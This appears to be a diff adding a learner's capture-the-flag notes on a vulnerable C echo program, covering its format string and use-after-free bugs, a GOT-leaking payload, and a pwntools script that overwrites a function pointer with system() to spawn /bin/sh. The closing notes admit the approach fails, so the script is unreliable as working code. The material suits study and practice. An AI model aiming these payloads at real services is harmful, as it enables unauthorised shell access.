@@ -1,0 +1,258 @@
+rdi, rsi, rdx, rcx
+########################################################################
+
+struct formalities{
+	char name[24];
+	void (*greeting)(char *);
+	void (*farewell)(char *);
+};
+
+struct formalities *o;
+char id[4];
+void (*func[3])(void);
+
+void get_input(char *buf, int size){
+	fgets(buf, size, stdin);
+}
+
+void greetings(char *name){
+	printf("hello %s\n", name);
+}
+
+void byebye(char *name){
+	printf("goodbye %s\n", name);
+}
+
+void echo1(){
+	puts("not supported");
+}
+
+void echo2(){
+	char buff[32];
+	o->greeting(o->name);
+	get_input(buff, 32);
+	printf(buff); // format string vulnerability
+	o->farewell(o->name);
+}
+
+void echo3(){
+	char *ptr;
+	o->greeting(o->name);
+	ptr = malloc(32);
+	get_input(ptr, 32);
+	puts(ptr);
+	free(ptr);
+	o->farewell(o->name);
+}
+
+void cleanup(){
+	free(o); // uaf
+}
+
+
+
+int main(){
+	char buff[24];
+	unsigned int answer;
+	setvbuf(stdout, NULL, _IONBF, 0);
+	setvbuf(stdin, NULL, _IOLBF, 0);
+
+	o = malloc(0x28); // or malloc(sizeof(struct formalities))
+	o->greeting = greetings;
+	o->farewell = byebye;
+
+	printf("hey, what's your name? : ");
+	scanf("%24s", buff);
+	o->name[0...7] = buff[0...7];
+	o->name[8...15] = buff[8...15];
+	o->name[16...23] = buff[16...23];
+	id[0...3] = buff[0...3];
+	getchar();
+
+	func[0] = echo1;
+	func[1] = echo2;
+	func[2] = echo3;
+	answer = 0;
+
+	while (1){
+		puts("\n- select echo type -");
+		puts("- 1 : BOF echo");
+		puts("- 2 : FSB echo");
+		puts("- 3 : UAF echo");
+		puts("- 4 : exit");
+		printf("> ");
+	
+		scanf("%d", &answer);
+		getchar();
+
+		if (answer < 4){
+			func[answer - 1]();
+		}
+		else if (answer != 4){
+			puts("invalid menu");
+		}
+		else{
+			cleanup();
+			printf("Are you sure you want to exit? (y/n) ");
+			answer = getchar();
+			if (answer != 'y'){
+				continue;
+			}
+			break;
+		}
+	}
+	
+	
+	
+}
+
+########################################################################
+
+there is a uaf vulnerability here, first call cleanup function then call echo3 which will call malloc and allocate space (this only works if the previously freed space
+is allocated that contains the function pointers, else it fails), we write the address of system into this space and also "/bin/sh" into the space for the name of struct,
+this will give us shell access...
+
+1. 0x603290 is the location of the chunk we allocated
+2. went on to free then reallocate in echo3 and we got the chunk, this can work, just need to get address of system function
+
+system is contained at offset 050d70
+aslr randomized where the libc library is loaded so i need to use the format string vulnerability to leak the base of libc
+
+0x125c12d1 0xfbad2288 0x125c12ef (nil) (nil) 0x7025702570257025 0x7025702570257025 0x7025702570257025 0xa702570257025 0x7ffcdcfa41c0 0x400acb (nil) 0x200000000 0x636469 (nil)
+
+can put the address of a GOT entry into the print buffer then use the format string vuln with %s to print the contents of the GOT
+
+0x00007ffff7e06e50
+
+so 0x602008 is address of puts@got.plt
+
+python2 -c "print('idc\n2\n\x08\x20\x60\x00\x00\x00\x00\x00%p%p%p%p%p %s \n4\ny\n')"
+
+
+this command should work for leaking the address of puts:
+python2 -c "print('idc\n2\n%p%p%p%p%p%p%p%p%saaaaaa\x08\x20\x60\x00\x00\x00\x00\x00\n4\ny\n')" | ./echo2
+where puts will be the last pointer printed
+
+testing to see if above payload works...
+
+0x7ffff7e06e50
+answer: 0x7ffff7e06e50
+so correct and this payload works to leak address of puts
+
+puts offset is 0x080e50 so we just need to subtract this from the leaked address we get, then add the system offset to it which is 0x050d70 and now we have the address of the
+system function, now to do some more reasearch on the uaf part of the vulnerability...
+
+found out i can only write to the 7 most least significant bytes of the function pointer to greeting but this shouldn't be a problem since the most significant byte
+of system should be a null byte
+
+so the steps of the exploit are as follows...
+
+1. go to echo2 and leak the address of puts using the above method
+
+2. calculate the address of system using the leaked address
+
+3. fake quit the program to free the proper area of memory
+
+4. go to echo3 to allocate the space that was previously freed and overwrite the previous greeting function with the address of system and the name member with "/bin/sh"
+
+5. call either echo2 or echo3 to call system with "/bin/sh" as argument
+
+6. achieve shell access and get key :)
+
+now to just code this...
+
+########################################################################
+from pwn import *
+import os
+
+# Get the value of the PATH environment variable
+# path_variable = os.environ.get('PATH')
+# print(path_variable)
+io = remote('localhost', 9011)
+
+print(io.recvuntil(b': '))
+
+io.send(b"idc\n")
+
+print(io.recvuntil(b'> '))
+
+puts_offset = 0x080e50
+system_offset = 0x050d70
+
+io.send(b"2\n")
+
+payload = b"%p%p%p%p%p%p%p%p%saaaaaa\x08\x20\x60\x00\x00\x00\x00\x00\n"
+
+print(io.recvuntil(b'\n'))
+io.send(payload)
+
+answer = io.recvuntil(b'\n')
+puts_address = b""
+switch = False
+print(answer)
+for i in range(4, len(answer)):
+    if (answer[i-1] == b"5"[0] and answer[i-2] == b"2"[0] and answer[i-3] == b"3"[0] and answer[i-4] == b"7"[0]):
+        switch = True
+    if (answer[i] == b"a"[0] and switch):
+        break
+    if switch:
+        puts_address = puts_address + answer[i].to_bytes(1, "little")
+
+
+print("puts is: ", puts_address, puts_address.hex())
+puts_address = puts_address[::-1].hex()
+print(puts_address)
+puts_address = int(puts_address, 16)
+print(puts_address)
+libc_base = puts_address - puts_offset
+system_address = libc_base + system_offset
+
+# print(io.recvuntil(b'> '))
+io.send(b'4\n')
+print(io.recvuntil(b'(y/n)'))
+io.send(b'n\n')
+print("here:", io.recvuntil(b'> '))
+io.send(b"3\n")
+payload = b'/bin/sh\0' + b'\0'*16 + p64(system_address) + b'\n'
+# payload = b'/bin/sh\0' + b'\n'
+print(payload[3])
+io.send(payload)
+print(io.recvuntil(b'> '))
+io.send(b"3\n")
+# print(io.recv(10))
+io.interactive()
+
+
+
+io.close()
+
+# strlen_addr_int = int.from_bytes(strlen_addr, "little")
+# libc_base = strlen_addr_int - strlen_offset
+# system_addr = libc_base + system_offset # this is our solution
+
+# io.send(p32(system_addr))
+
+# print(io.recv())
+########################################################################
+
+x/16x 0x603290
+
+Note that apparently free scrambles some memory at whatever pointer is given as argument (in my case it seems 16 bytes) so now idk wtf to do since name is overwritten, i need
+to find another way, the tools i have at my disposial now is i can go to any piece of code i want now but i can't give that piece of code arguments. Can i call the get_input
+function with a size value of something higher than 32???
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
